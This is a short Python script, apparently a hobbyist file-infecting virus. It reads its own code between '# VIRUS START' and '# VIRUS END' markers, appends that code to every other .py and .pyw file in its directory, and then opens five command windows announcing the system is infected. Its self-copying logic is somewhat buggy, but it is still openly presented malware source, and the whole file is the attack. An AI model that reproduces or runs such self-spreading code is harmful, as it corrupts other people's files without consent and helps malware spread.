# VIRUS START
import sys
import glob
import os

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
self_replicating_part = False
for line in lines:
    if line == "# VIRUS START":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS END\n":
        break
    
curr_dir = os.path.dirname(os.path.abspath(__file__))
python_files = glob.glob(curr_dir + '/*.py') + glob.glob(curr_dir + '/*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    infected = False
    for line in file_code:
        if line == "# VIRUS START\n":
            infected = True
            break
        if not infected:
            final_code = []
            final_code.extend(file_code)
            final_code.extend('\n\n\n\n')
            final_code.extend(virus_code)
            with open(file, 'w') as f:
                f.writelines(final_code)
def malicious_code():
    for _ in range(5):
        os.system('start cmd /k "echo The System is now INFECTED !!"')     
malicious_code()
# VIRUS END
